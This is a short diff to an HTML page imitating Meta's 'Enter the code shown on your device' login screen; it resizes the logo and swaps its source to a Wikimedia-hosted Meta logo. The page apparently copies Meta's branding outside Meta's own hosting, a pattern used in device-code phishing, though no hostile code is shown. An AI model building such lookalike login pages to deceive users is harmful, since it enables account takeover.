@@ -21,7 +21,10 @@
       padding:16px;
     }
     .container{width:100%;max-width:420px;text-align:center}
-    img.logo{height:28px;margin-bottom:28px}
+    img.logo{
+      height:60px;   /* Increased from 28px */
+      margin-bottom:28px;
+    }
     h1{font-size:20px;margin-bottom:8px;font-weight:600}
     p.lead{color:var(--muted);margin-bottom:20px;font-size:15px}
 
@@ -69,12 +72,13 @@
       h1{font-size:18px}
       p.lead{font-size:14px}
       input[type="text"], button.primary{font-size:14px;padding:12px}
+      img.logo{height:50px;} /* slightly smaller on mobile */
     }
   </style>
 </head>
 <body>
   <main class="container" aria-labelledby="title">
-    <img src="https://static.xx.fbcdn.net/rsrc.php/yv/r/B8BxsscfVBr.svg" alt="Meta logo" class="logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ab/Meta-Logo.png/1200px-Meta-Logo.png?20211104123859" alt="Meta logo" class="logo">
     <h1 id="title">Enter the code shown on your device</h1>
     <p class="lead">Only use a code from a source that you trust. <a href="https://meta.com/help" target="_blank" rel="noopener">Need help?</a></p>
 
